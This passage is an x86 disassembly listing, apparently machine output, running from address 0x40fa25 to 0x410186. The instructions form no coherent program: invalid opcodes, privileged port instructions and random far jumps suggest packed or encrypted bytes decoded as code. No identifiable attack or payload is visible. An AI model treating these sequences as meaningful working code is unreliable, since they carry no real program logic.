  40fa25:	(bad)  
  40fa26:	retf   
  40fa27:	div    ebp
  40fa29:	aaa    
  40fa2a:	test   eax,0x46ff6b7b
  40fa2f:	test   al,bh
  40fa31:	mov    esp,0xb6c8f5aa
  40fa36:	sahf   
  40fa37:	pop    esi
  40fa38:	fisubr WORD PTR [esi-0x18]
  40fa3b:	xor    eax,0x1c48ce9d
  40fa40:	push   ss
  40fa41:	jo     0x40fab6
  40fa43:	sub    BYTE PTR [ecx-0x56],0xc4
  40fa47:	mov    ecx,0x32088ed9
  40fa4c:	xor    edx,DWORD PTR [edx-0x1fdd74de]
  40fa52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa53:	push   eax
  40fa54:	test   eax,ebp
  40fa56:	mov    ds:0x103a0a51,al
  40fa5b:	fsub   QWORD PTR [esi+0x40ea3c0b]
  40fa61:	push   esi
  40fa62:	repnz and eax,0xb1785957
  40fa68:	jne    0x40fa91
  40fa6a:	(bad)  
  40fa6c:	fadd   QWORD PTR [edx+edi*4-0x5c]
  40fa70:	repnz popa 
  40fa72:	mov    BYTE PTR [esi],al
  40fa74:	iret   
  40fa75:	aaa    
  40fa76:	inc    edi
  40fa77:	jo     0x40fa92
  40fa79:	loope  0x40fa53
  40fa7b:	test   BYTE PTR [ebx+0x39],cl
  40fa7e:	inc    ebp
  40fa7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa80:	sub    dl,ah
  40fa82:	dec    eax
  40fa83:	pop    esi
  40fa84:	aaa    
  40fa85:	mov    cl,0xfc
  40fa87:	stos   DWORD PTR es:[edi],eax
  40fa88:	or     dh,BYTE PTR [edi]
  40fa8a:	dec    esp
  40fa8b:	push   ebp
  40fa8c:	lahf   
  40fa8d:	dec    edi
  40fa8e:	add    DWORD PTR [ebx+0x9],0x29c6b2c5
  40fa95:	in     al,0xde
  40fa97:	add    al,0x10
  40fa99:	inc    eax
  40fa9a:	test   eax,0x2e4e7cf7
  40fa9f:	in     al,0x6c
  40faa1:	mov    bh,0x5a
  40faa3:	adc    eax,0x207e4b8b
  40faa8:	and    eax,0x7304c71d
  40faad:	mov    al,ds:0x43819f6
  40fab2:	and    ebp,DWORD PTR [ecx-0x7e5d0b91]
  40fab8:	cmp    DWORD PTR [esi],edi
  40faba:	test   al,0x86
  40fabc:	cmc    
  40fabd:	push   es
  40fabe:	cli    
  40fabf:	cwde   
  40fac0:	jns    0x40faf3
  40fac2:	push   es
  40fac3:	adc    al,0x9a
  40fac5:	push   cs
  40fac6:	call   0x9503:0xfbce8cf6
  40facd:	icebp  
  40face:	lock ret 
  40fad0:	adc    cl,BYTE PTR [eax+0x3f]
  40fad3:	lds    ebp,FWORD PTR [eax]
  40fad5:	xlat   BYTE PTR ds:[ebx]
  40fad6:	inc    esp
  40fad7:	adc    eax,0xcb362268
  40fadc:	sub    DWORD PTR ds:0x8ec9f032,ebx
  40fae2:	or     esp,DWORD PTR [ebp+0x1f]
  40fae5:	cdq    
  40fae6:	not    DWORD PTR [eax]
  40fae8:	mov    edx,0x5745fe0a
  40faed:	daa    
  40faee:	inc    edi
  40faef:	sti    
  40faf0:	sub    al,0xc5
  40faf2:	imul   BYTE PTR [esi+ebx*4]
  40faf5:	stos   DWORD PTR es:[edi],eax
  40faf6:	outs   dx,DWORD PTR ds:[esi]
  40faf7:	out    0x40,al
  40faf9:	push   esp
  40fafa:	shr    DWORD PTR [eax],cl
  40fafc:	gs scas al,BYTE PTR es:[edi]
  40fafe:	pop    ebp
  40faff:	xchg   esi,eax
  40fb00:	inc    ebp
  40fb01:	popa   
  40fb02:	xchg   edi,ecx
  40fb04:	xchg   DWORD PTR [ebp+0x4d],eax
  40fb07:	retf   0xa07
  40fb0a:	stc    
  40fb0b:	jmp    0xc8de:0x5f15d73
  40fb12:	aaa    
  40fb13:	jmp    FWORD PTR [esp+ecx*4]
  40fb16:	and    al,0x1b
  40fb18:	inc    esp
  40fb19:	pop    edi
  40fb1a:	lea    ebx,[ebp-0x10e4dee7]
  40fb20:	mov    esi,0x1c7b13c2
  40fb25:	rcr    BYTE PTR [eax+0x61],0x14
  40fb29:	ds cmp eax,0xdda79c10
  40fb2f:	int3   
  40fb30:	mov    ecx,ds
  40fb32:	cwde   
  40fb33:	lock inc ebx
  40fb35:	jle    0x40fb30
  40fb37:	xchg   edi,eax
  40fb38:	ss jno 0x40fafa
  40fb3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb3c:	mov    bl,0xaa
  40fb3e:	outs   dx,DWORD PTR ds:[esi]
  40fb3f:	mov    edx,0x7bc84b38
  40fb44:	loope  0x40fb4c
  40fb46:	mov    WORD PTR [edi],ds
  40fb48:	xchg   esi,eax
  40fb49:	xchg   DWORD PTR [edx],esp
  40fb4b:	mov    ah,0xaf
  40fb4d:	dec    edi
  40fb4e:	call   0xb036:0x80266c5b
  40fb55:	jge    0x40fb78
  40fb57:	mov    ebx,cr1
  40fb5a:	jl     0x40fb6f
  40fb5c:	es mov ah,0x64
  40fb5f:	arpl   WORD PTR [ebp+0x2],sp
  40fb62:	iret   
  40fb63:	icebp  
  40fb64:	add    BYTE PTR ds:0x83c7a25e,0xa6
  40fb6b:	(bad)  
  40fb6c:	and    DWORD PTR [edx],ecx
  40fb6e:	xor    DWORD PTR [esi+0x168c1ffe],ebp
  40fb74:	bound  esi,QWORD PTR [eax+eiz*8-0x152322f9]
  40fb7b:	inc    esp
  40fb7c:	lods   al,BYTE PTR ds:[esi]
  40fb7d:	ja     0x40fb5e
  40fb7f:	pop    eax
  40fb80:	sbb    edx,DWORD PTR [esi+0x56]
  40fb83:	es lahf 
  40fb85:	arpl   dx,bx
  40fb87:	lods   eax,DWORD PTR ds:[esi]
  40fb88:	ja     0x40fb6e
  40fb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb8b:	push   edx
  40fb8c:	pop    ds
  40fb8d:	outs   dx,BYTE PTR ds:[esi]
  40fb8e:	sbb    eax,0x3e05e877
  40fb93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb94:	sub    esi,eax
  40fb96:	dec    ecx
  40fb97:	mov    bl,0xb9
  40fb99:	xchg   esi,eax
  40fb9a:	mov    edi,esi
  40fb9c:	out    dx,eax
  40fb9d:	je     0x40fbcd
  40fb9f:	popf   
  40fba0:	rcl    DWORD PTR [edi+ecx*1],cl
  40fba3:	xchg   BYTE PTR [ecx-0x7],bh
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x61
  40fbc9:	jp     0x40fb59
  40fbcb:	stc    
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbd5:	xchg   ebp,eax
  40fbd6:	and    eax,DWORD PTR [esi+eax*4+0x37]
  40fbda:	loopne 0x40fc1b
  40fbdc:	and    eax,0xbcaac2ea
  40fbe1:	mov    ah,0x73
  40fbe3:	push   es
  40fbe4:	imul   eax,DWORD PTR [ebp+0x22b6093d],0x75
  40fbeb:	jecxz  0x40fc25
  40fbed:	mov    edi,0xddef464f
  40fbf2:	(bad)  
  40fbf3:	loopne 0x40fbef
  40fbf5:	inc    ebx
  40fbf6:	retf   0x4609
  40fbf9:	sub    bh,bh
  40fbfb:	test   eax,0x3dc953e2
  40fc00:	fdivr  DWORD PTR [ecx]
  40fc02:	sub    DWORD PTR [ecx-0x4a0b3fdd],ebx
  40fc08:	or     ecx,DWORD PTR [ebp-0x30]
  40fc0b:	sbb    eax,0x5184bc53
  40fc10:	stc    
  40fc11:	cmp    DWORD PTR [edx-0x1e68813f],ebp
  40fc17:	jp     0x40fc6a
  40fc19:	xchg   ebp,eax
  40fc1a:	push   edi
  40fc1b:	shl    BYTE PTR [ebx+0x54],0xc9
  40fc1f:	popa   
  40fc20:	cmp    bh,BYTE PTR [ebp-0x45]
  40fc23:	inc    edi
  40fc24:	fmul   DWORD PTR [ecx]
  40fc26:	adc    ch,0x82
  40fc29:	push   ss
  40fc2a:	sbb    al,0x48
  40fc2c:	scas   al,BYTE PTR es:[edi]
  40fc2d:	(bad)  
  40fc2e:	out    dx,al
  40fc2f:	push   esi
  40fc30:	mov    fs,WORD PTR [edi+ecx*1]
  40fc33:	imul   ebp,DWORD PTR [eax+0x6326da9c],0xffffff89
  40fc3a:	popa   
  40fc3b:	int    0x3e
  40fc3d:	cwde   
  40fc3e:	icebp  
  40fc3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc40:	or     al,0xa3
  40fc42:	in     al,dx
  40fc43:	out    dx,eax
  40fc44:	call   0xbc8b:0xaa06ca43
  40fc4b:	adc    DWORD PTR [ebp-0x3f],edi
  40fc4e:	inc    edi
  40fc4f:	xor    DWORD PTR [edi+0x5f4d3dc1],eax
  40fc55:	push   edx
  40fc56:	cmp    ah,ah
  40fc58:	sbb    dl,BYTE PTR [edi+0x5e]
  40fc5b:	xor    eax,0xe5fff096
  40fc60:	fs dec edi
  40fc62:	fisttp QWORD PTR [ecx-0x5521669a]
  40fc68:	imul   eax,esp
  40fc6b:	inc    eax
  40fc6c:	push   ds
  40fc6d:	fdivr  DWORD PTR [esi-0x7]
  40fc70:	inc    ebp
  40fc71:	mov    al,BYTE PTR [ecx]
  40fc73:	enter  0x3c95,0xc
  40fc77:	xchg   ebp,eax
  40fc78:	mov    edi,0x4c1f86ac
  40fc7d:	test   al,0x6e
  40fc7f:	add    edi,DWORD PTR [ebx+0x6b]
  40fc82:	cld    
  40fc83:	rcl    bl,1
  40fc85:	popa   
  40fc86:	hlt    
  40fc87:	dec    edi
  40fc88:	test   BYTE PTR [ebp-0x794763a2],ch
  40fc8e:	mov    fs,WORD PTR [esi+eiz*4+0x37]
  40fc92:	lods   eax,DWORD PTR ds:[esi]
  40fc93:	mov    esp,0xaaee87c7
  40fc98:	push   esp
  40fc99:	mov    dl,0x18
  40fc9b:	mov    BYTE PTR [eax],ah
  40fc9d:	test   eax,0x1eb69d07
  40fca2:	xchg   ebp,eax
  40fca3:	cmp    edx,esp
  40fca5:	mov    cl,0x4f
  40fca7:	popa   
  40fca8:	dec    eax
  40fca9:	les    esi,FWORD PTR [ebx+ecx*4+0x6a]
  40fcad:	jle    0x40fc3f
  40fcaf:	jg     0x40fc9d
  40fcb1:	popf   
  40fcb2:	pusha  
  40fcb3:	cld    
  40fcb4:	into   
  40fcb5:	es jmp 0x861c1adf
  40fcbb:	pop    ds
  40fcbc:	aad    0xb9
  40fcbe:	xor    DWORD PTR [esi],ebx
  40fcc0:	sbb    BYTE PTR [ebp+0x7a366bc3],cl
  40fcc6:	loopne 0x40fcef
  40fcc8:	in     eax,dx
  40fcc9:	add    al,al
  40fccb:	(bad)  
  40fccc:	lods   eax,DWORD PTR ds:[esi]
  40fccd:	adc    esi,DWORD PTR [ebx-0x167b77dd]
  40fcd3:	test   DWORD PTR [esi+edi*2],0x38acc997
  40fcda:	cmp    dh,ah
  40fcdc:	or     al,BYTE PTR [esi+0x4b91cee7]
  40fce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fce3:	push   ebp
  40fce4:	jbe    0x40fd4b
  40fce6:	scas   al,BYTE PTR es:[edi]
  40fce7:	outs   dx,BYTE PTR ds:[esi]
  40fce8:	or     eax,0xb99c7203
  40fced:	cmp    ah,BYTE PTR [edi+0x55]
  40fcf0:	xchg   edi,eax
  40fcf1:	retf   0x236c
  40fcf4:	fcmovbe st,st(2)
  40fcf6:	mov    eax,0xcb8aeaaa
  40fcfb:	lea    edx,[edi]
  40fcfd:	aad    0x39
  40fcff:	mov    edx,0xcb964d8c
  40fd04:	sbb    DWORD PTR [ecx+0x78],esi
  40fd07:	add    ch,ah
  40fd09:	sub    ah,bl
  40fd0b:	lock mov ds:0x6e14a84e,eax
  40fd11:	out    dx,eax
  40fd12:	push   0xb0a87525
  40fd17:	xor    ch,BYTE PTR [edx-0x35]
  40fd1a:	retf   0x5ddd
  40fd1d:	push   eax
  40fd1e:	aas    
  40fd1f:	je     0x40fcef
  40fd21:	int3   
  40fd22:	or     al,al
  40fd24:	dec    esi
  40fd25:	mov    dl,0x1
  40fd27:	adc    eax,0x4545499f
  40fd2c:	es inc esp
  40fd2e:	xor    DWORD PTR [eax-0x1a],0x89ff67b6
  40fd35:	mov    WORD PTR [edi+0x57],gs
  40fd38:	sbb    al,0x8d
  40fd3a:	xchg   esp,eax
  40fd3b:	adc    eax,0x77e50b30
  40fd40:	pusha  
  40fd41:	xchg   edi,eax
  40fd42:	outs   dx,BYTE PTR ds:[esi]
  40fd43:	push   edx
  40fd44:	fistp  WORD PTR [esi-0x75]
  40fd47:	xor    edi,DWORD PTR [edx+0x52]
  40fd4a:	mov    cl,0xb4
  40fd4c:	scas   eax,DWORD PTR es:[edi]
  40fd4d:	inc    ebx
  40fd4e:	pop    ebp
  40fd4f:	(bad)  
  40fd50:	cwde   
  40fd51:	jae    0x40fcff
  40fd53:	stos   DWORD PTR es:[edi],eax
  40fd54:	ret    0x1000
  40fd57:	jmp    0x9e838e5f
  40fd5c:	fstp   QWORD PTR [esi]
  40fd5e:	cdq    
  40fd5f:	test   DWORD PTR [esi],esp
  40fd61:	sar    BYTE PTR [ebp-0x3],cl
  40fd64:	es inc eax
  40fd66:	into   
  40fd67:	adc    BYTE PTR [ecx],dh
  40fd69:	cmp    dl,cl
  40fd6b:	aaa    
  40fd6c:	test   DWORD PTR [ebx-0x59],ebx
  40fd6f:	add    ecx,DWORD PTR [eax]
  40fd71:	test   DWORD PTR [esi+0x29],0xc1e8ea39
  40fd78:	sbb    DWORD PTR [edx],edi
  40fd7a:	or     ah,bh
  40fd7c:	retf   
  40fd7d:	leave  
  40fd7e:	imul   esp,DWORD PTR [ecx+0x14],0x40
  40fd82:	xchg   ebp,eax
  40fd83:	fadd   DWORD PTR [esi+0x67dc05fd]
  40fd89:	aas    
  40fd8a:	dec    esp
  40fd8b:	push   ss
  40fd8c:	and    BYTE PTR [ebp+ecx*8-0x77],0xa6
  40fd91:	xor    BYTE PTR [edx-0x73b91a1a],bl
  40fd97:	repnz mov dl,0x53
  40fd9a:	mov    DWORD PTR [ebx+0xc],ebp
  40fd9d:	fistp  QWORD PTR [edx+eiz*2+0x654c545e]
  40fda4:	cmp    al,0x24
  40fda6:	inc    ebx
  40fda7:	xor    esi,esp
  40fda9:	cmp    BYTE PTR [eax],ah
  40fdab:	mov    ah,0x66
  40fdad:	sbb    dh,BYTE PTR [ebp+edx*4-0x1e]
  40fdb1:	or     eax,0xdef47995
  40fdb6:	loopne 0x40fe20
  40fdb8:	push   ds
  40fdb9:	int3   
  40fdba:	or     edi,DWORD PTR [ecx-0x1]
  40fdbd:	mov    esp,0xe0281189
  40fdc2:	scas   eax,DWORD PTR es:[edi]
  40fdc3:	push   eax
  40fdc4:	cmp    ebx,DWORD PTR [ecx-0x46]
  40fdc7:	push   0x7d
  40fdc9:	ret    
  40fdca:	pop    esi
  40fdcb:	xchg   edi,eax
  40fdcc:	mov    esp,0x59e89e5f
  40fdd1:	or     al,0x24
  40fdd3:	adc    BYTE PTR [edx+0x5a],ah
  40fdd6:	mov    esp,0xab4b4411
  40fddb:	xor    BYTE PTR [ebx],bl
  40fddd:	inc    esi
  40fdde:	retf   
  40fddf:	ret    0x27d0
  40fde2:	mov    DWORD PTR [esp+eax*2],esi
  40fde5:	stos   BYTE PTR es:[edi],al
  40fde6:	jmp    0x40fda7
  40fde8:	loopne 0x40fe05
  40fdea:	push   ecx
  40fdeb:	mov    ds:0xcbf2984,al
  40fdf0:	cmp    DWORD PTR [ebx+0x36],esi
  40fdf3:	inc    edx
  40fdf4:	addr16 jmp 0x7ead:0x718eca2a
  40fdfc:	mov    bh,0xd9
  40fdfe:	adc    al,0xbd
  40fe00:	push   ebp
  40fe01:	or     esi,DWORD PTR [eax+0x4c]
  40fe04:	mov    ah,0x6b
  40fe06:	cmc    
  40fe07:	in     eax,dx
  40fe08:	push   eax
  40fe09:	xor    eax,0xfdb38c6e
  40fe0e:	divps  xmm4,XMMWORD PTR [eax+0x2293e718]
  40fe15:	mov    ebp,0x1c70af1f
  40fe1a:	mov    ebp,0x7610e703
  40fe1f:	or     al,0x9a
  40fe21:	mov    dh,0x78
  40fe23:	sub    BYTE PTR [esi-0x590e7880],ah
  40fe29:	int    0x6f
  40fe2b:	and    al,BYTE PTR [edx-0x40]
  40fe2e:	xchg   edi,eax
  40fe2f:	mov    cl,0x89
  40fe31:	sbb    al,0x60
  40fe33:	push   eax
  40fe34:	dec    ebx
  40fe35:	jno    0x40fe77
  40fe37:	mov    cl,0xf1
  40fe39:	out    dx,al
  40fe3a:	add    eax,DWORD PTR [edi+0x4b]
  40fe3d:	enter  0xa16b,0xfd
  40fe41:	jge    0x40fe57
  40fe43:	sbb    eax,0xb4b27d09
  40fe48:	mov    ecx,0x1a4739af
  40fe4d:	gs aad 0x46
  40fe50:	mov    eax,ds:0x3f76c075
  40fe55:	push   ebx
  40fe56:	jge    0x40fe93
  40fe58:	and    dh,cl
  40fe5a:	(bad)  
  40fe5b:	imul   esi,DWORD PTR [edx-0x9205bd1],0x5feb0cc3
  40fe65:	push   esi
  40fe66:	enter  0x3f13,0xd2
  40fe6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe6b:	add    ebx,DWORD PTR [eax]
  40fe6d:	jmp    0x40fe0f
  40fe6f:	or     ecx,DWORD PTR [ecx+0x1]
  40fe72:	push   eax
  40fe73:	rcr    DWORD PTR [ebx-0x78],1
  40fe76:	mov    ebx,ecx
  40fe78:	call   0x2551:0xa2e1deee
  40fe7f:	jo     0x40fe7c
  40fe81:	push   ds
  40fe82:	xchg   DWORD PTR [ebp+0x7c],ebp
  40fe85:	int    0x88
  40fe87:	xchg   ah,dl
  40fe89:	lock ss inc edx
  40fe8c:	jge    0x40fe8b
  40fe8e:	cs out 0xe5,al
  40fe91:	aas    
  40fe92:	fst    DWORD PTR [ebp-0x3f]
  40fe95:	sbb    BYTE PTR [ebx],ch
  40fe97:	in     al,0x2a
  40fe99:	push   sp
  40fe9b:	push   ds
  40fe9c:	nop
  40fe9d:	je     0x40fe9d
  40fe9f:	aam    0x80
  40fea1:	mov    eax,0x6ed1495e
  40fea6:	mov    esi,0xddad1c03
  40feab:	or     al,0x63
  40fead:	test   BYTE PTR [edx-0x58],bl
  40feb0:	pop    eax
  40feb1:	pushf  
  40feb2:	jmp    0x13bf4acd
  40feb7:	push   ecx
  40feb8:	bound  esp,QWORD PTR [edi]
  40feba:	pushf  
  40febb:	or     bl,BYTE PTR [eax+0x5de50769]
  40fec1:	es xor al,0xb3
  40fec4:	mov    BYTE PTR [edx],bh
  40fec6:	or     ebx,edi
  40fec8:	test   DWORD PTR [ebx-0x244384e1],esp
  40fece:	push   cs
  40fecf:	dec    ebp
  40fed0:	add    bh,BYTE PTR [edx]
  40fed2:	stos   BYTE PTR es:[edi],al
  40fed3:	ficom  WORD PTR [esp+edi*2+0x330c458b]
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xc0c4346
  40fef3:	mov    al,0x87
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	mov    edi,0x90ed0966
  40ff02:	push   edx
  40ff03:	int    0xc6
  40ff05:	shl    esi,1
  40ff07:	(bad)  
  40ff08:	adc    dl,BYTE PTR [esi]
  40ff0a:	retf   
  40ff0b:	es jg  0x40ff67
  40ff0e:	inc    esi
  40ff0f:	lahf   
  40ff10:	aaa    
  40ff11:	jp     0x40ff86
  40ff13:	inc    edi
  40ff14:	test   al,0x9d
  40ff16:	mul    esp
  40ff18:	clc    
  40ff19:	mov    ah,0x5f
  40ff1b:	or     ebx,DWORD PTR [esi]
  40ff1d:	sbb    DWORD PTR [edi+0x16],0xe452846f
  40ff24:	jmp    0x40ff5c
  40ff26:	ins    BYTE PTR es:[edi],dx
  40ff27:	(bad)  
  40ff28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff29:	(bad)  
  40ff2a:	out    dx,al
  40ff2b:	and    bl,dh
  40ff2d:	test   BYTE PTR [eax],0x3
  40ff30:	push   ds
  40ff31:	lea    esi,[edx]
  40ff33:	jb     0x40ff40
  40ff35:	sub    DWORD PTR ds:0x30bdc1b9,eax
  40ff3b:	dec    eax
  40ff3c:	mov    DWORD PTR [eax+0x2cdcf572],esp
  40ff42:	stos   DWORD PTR es:[edi],eax
  40ff43:	int3   
  40ff44:	std    
  40ff45:	mov    ds:0x5d8aa7a9,eax
  40ff4a:	pop    edi
  40ff4b:	sahf   
  40ff4c:	ja     0x40ff59
  40ff4e:	test   dh,0x52
  40ff51:	sbb    cl,dh
  40ff53:	out    dx,al
  40ff54:	push   ds
  40ff55:	jp     0x40ff18
  40ff57:	fdivr  st(5),st
  40ff59:	dec    esp
  40ff5a:	xchg   BYTE PTR [ebx+0x25],bl
  40ff5d:	dec    esp
  40ff5e:	sbb    esp,DWORD PTR ds:0x335b1e65
  40ff64:	push   esp
  40ff65:	(bad)  
  40ff66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff67:	loopne 0x40fee9
  40ff69:	aad    0xfb
  40ff6b:	jbe    0x40ffc5
  40ff6d:	adc    eax,0xabf50972
  40ff72:	inc    ecx
  40ff73:	xor    esi,DWORD PTR [edx]
  40ff75:	jmp    0xe9a3b305
  40ff7a:	cs fnstenv cs:[edx+0x174997a8]
  40ff82:	pop    esi
  40ff83:	and    al,0x5d
  40ff85:	jae    0x40ff96
  40ff87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff88:	and    eax,0xe1d15aab
  40ff8d:	inc    esi
  40ff8e:	int3   
  40ff8f:	mov    DWORD PTR [edi*1+0x7abdfc4],ebx
  40ff96:	call   0xac5b23bf
  40ff9b:	ins    BYTE PTR es:[edi],dx
  40ff9c:	jnp    0x40ff28
  40ff9e:	daa    
  40ff9f:	sbb    ebp,ebx
  40ffa1:	push   cs
  40ffa2:	mov    edx,0xac4238a
  40ffa7:	adc    al,0xbd
  40ffa9:	push   ss
  40ffaa:	mov    esp,0x3fb1541f
  40ffaf:	pop    ebp
  40ffb0:	int    0xcd
  40ffb2:	adc    bh,BYTE PTR [ebp+0x4]
  40ffb5:	stos   BYTE PTR es:[edi],al
  40ffb6:	dec    edi
  40ffb7:	shl    ebp,cl
  40ffb9:	mov    BYTE PTR es:[esi+0x2bcf2f33],al
  40ffc0:	into   
  40ffc1:	jl     0x40ff4b
  40ffc3:	lahf   
  40ffc4:	fwait
  40ffc5:	add    eax,0x8709f5ad
  40ffca:	loopne 0x40ff8b
  40ffcc:	cli    
  40ffcd:	push   esi
  40ffce:	jp     0x41001e
  40ffd0:	aam    0x6b
  40ffd2:	call   0x1c222bb1
  40ffd7:	aam    0xe4
  40ffd9:	cmp    bl,0x13
  40ffdc:	push   ss
  40ffdd:	adc    eax,0xa50cd836
  40ffe2:	adc    DWORD PTR [ebp+0x51],edx
  40ffe5:	es dec eax
  40ffe7:	test   al,0xa7
  40ffe9:	and    al,0x21
  40ffeb:	in     eax,0x80
  40ffed:	jno    0x41000d
  40ffef:	daa    
  40fff0:	jecxz  0x40ffb5
  40fff2:	lds    edx,FWORD PTR [esi]
  40fff4:	and    al,0x2a
  40fff6:	and    BYTE PTR [eax],dh
  40fff8:	(bad)  
  40fff9:	cmp    eax,0x5451b21
  40fffe:	cld    
  40ffff:	fidivr WORD PTR [ebp-0x76a718ff]
  410005:	outs   dx,DWORD PTR ds:[esi]
  410006:	xchg   ecx,eax
  410007:	scas   al,BYTE PTR es:[edi]
  410008:	cmp    ah,BYTE PTR [ecx-0x24]
  41000b:	push   ebx
  41000c:	inc    esi
  41000d:	mov    ds:0x93818bd,al
  410012:	push   esi
  410013:	xchg   BYTE PTR [ebx],al
  410015:	sub    al,0x26
  410017:	icebp  
  410018:	test   eax,0xd0e7a2c2
  41001d:	mov    ch,0xd5
  41001f:	(bad)  
  410020:	push   esi
  410021:	lea    edi,ds:0xd275d571
  410027:	dec    eax
  410028:	adc    eax,0xdddcdc42
  41002d:	mov    ebp,DWORD PTR [esi]
  41002f:	xor    esp,esp
  410031:	xchg   ebp,eax
  410032:	arpl   si,dx
  410034:	test   BYTE PTR [eax+0x2b16fbe2],ah
  41003a:	mov    edx,0x8ce5baa3
  41003f:	xchg   ecx,eax
  410040:	dec    ecx
  410041:	test   eax,0x4591977e
  410046:	mov    al,0xd6
  410049:	outs   dx,DWORD PTR ds:[esi]
  41004a:	mov    ds:0x8641a37e,eax
  41004f:	sbb    esi,ebp
  410051:	pop    ss
  410052:	jne    0x41004a
  410054:	jns    0x40fffa
  410056:	addr16 hlt 
  410058:	pop    eax
  410059:	cmp    bh,al
  41005b:	test   eax,0x21f8b200
  410060:	adc    DWORD PTR [ebp*8-0x2eb1b987],0xe9d79cfd
  41006b:	int3   
  41006c:	pop    ss
  41006d:	xor    eax,ebp
  41006f:	mov    ah,BYTE PTR [eax+0x5]
  410072:	push   ebp
  410073:	inc    ecx
  410074:	inc    esi
  410075:	dec    eax
  410076:	xchg   edx,eax
  410077:	inc    ebx
  410078:	(bad)  
  410079:	in     eax,0x86
  41007b:	xor    bl,BYTE PTR [edi+0x54]
  41007e:	adc    BYTE PTR [eax],dh
  410080:	mov    bl,0xf8
  410082:	test   DWORD PTR [esi+0x1b6cd4d4],0x151966d7
  41008c:	mov    al,0xf
  41008e:	pushf  
  41008f:	icebp  
  410090:	push   cs
  410091:	cmp    esp,eax
  410093:	scas   eax,DWORD PTR es:[edi]
  410094:	(bad)  
  410095:	imul   ecx,DWORD PTR [ebx+0x8],0xfec40bbe
  41009c:	cmp    edi,DWORD PTR [eax]
  41009e:	mul    DWORD PTR [ebx-0x50]
  4100a1:	mov    DWORD PTR [ebp+0x62],ebp
  4100a4:	jg     0x41006a
  4100a6:	lds    edi,FWORD PTR [edx]
  4100a8:	mov    al,BYTE PTR [ebx]
  4100aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100ab:	push   es
  4100ac:	pop    edx
  4100ad:	adc    al,0x36
  4100af:	lock aaa 
  4100b1:	shr    BYTE PTR [edx],1
  4100b3:	inc    eax
  4100b4:	jno    0x4100a4
  4100b6:	push   cs
  4100b7:	call   0xc4d2d2ff
  4100bc:	inc    eax
  4100bd:	mov    DWORD PTR es:[edi+0xe],eax
  4100c1:	sbb    ch,BYTE PTR [ebx+0x5b]
  4100c4:	js     0x41012b
  4100c6:	lea    edx,[ecx+0x6df0f63c]
  4100cc:	inc    ebx
  4100cd:	popa   
  4100ce:	fnstenv ds:0x31d8530a
  4100d4:	test   ecx,0x4ab35a1d
  4100da:	cs dec edi
  4100dc:	je     0x4100a8
  4100de:	(bad)  
  4100df:	iret   
  4100e0:	mov    esi,0xf20c33e
  4100e5:	(bad)  
  4100e6:	iret   
  4100e7:	push   esi
  4100e8:	push   esi
  4100e9:	test   DWORD PTR [ecx+0x9],0xb5268063
  4100f0:	inc    ebx
  4100f1:	test   dh,dl
  4100f3:	jle    0x41015d
  4100f5:	and    al,0x52
  4100f7:	shr    ebx,0x11
  4100fa:	aad    0xee
  4100fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100fd:	pop    eax
  4100fe:	and    ch,BYTE PTR [eax-0xd]
  410101:	pop    ss
  410102:	mov    dh,0xab
  410104:	loopne 0x410132
  410106:	ror    DWORD PTR [ecx+0x4eaada73],1
  41010c:	and    cl,BYTE PTR [ebp-0x3356c2da]
  410112:	int    0xd8
  410114:	rcr    DWORD PTR [ecx+esi*1-0x5],0xef
  410119:	(bad)  
  41011b:	sub    DWORD PTR [ebp+0x1523bbb7],ebx
  410121:	push   esi
  410122:	push   0xda513bb4
  410127:	aas    
  410128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41012a:	mov    cl,0x36
  41012c:	adc    eax,0x86150b19
  410131:	mov    ds:0xf9c5dca8,al
  410136:	je     0x410112
  410138:	jmp    0x59a4adf3
  41013d:	and    bl,BYTE PTR [ebp-0x28]
  410140:	scas   al,BYTE PTR es:[edi]
  410141:	cmc    
  410142:	inc    ebx
  410143:	and    DWORD PTR [ebx],0x15c303e8
  410149:	push   0xaaa0e925
  41014e:	loop   0x4101bd
  410150:	call   0x330b0baa
  410155:	cmp    cl,BYTE PTR [esi-0x4935cbf8]
  41015b:	and    al,BYTE PTR [esi+edx*1+0x1f1b2cea]
  410162:	pop    eax
  410163:	mov    ecx,0xf1d65646
  410168:	dec    ecx
  410169:	sar    BYTE PTR [ecx-0x63],1
  41016c:	push   ebx
  41016d:	pop    ebp
  41016e:	mov    edi,DWORD PTR [ecx+0x75ad7c3a]
  410174:	mov    bl,0x16
  410176:	push   0x6453de3b
  41017b:	mov    ?,WORD PTR [edx+edi*8+0x3bf1050a]
  410182:	loop   0x410109
  410184:	in     eax,dx
  410185:	leave  
  410186:	xlat   BYTE PTR ds:[ebx]
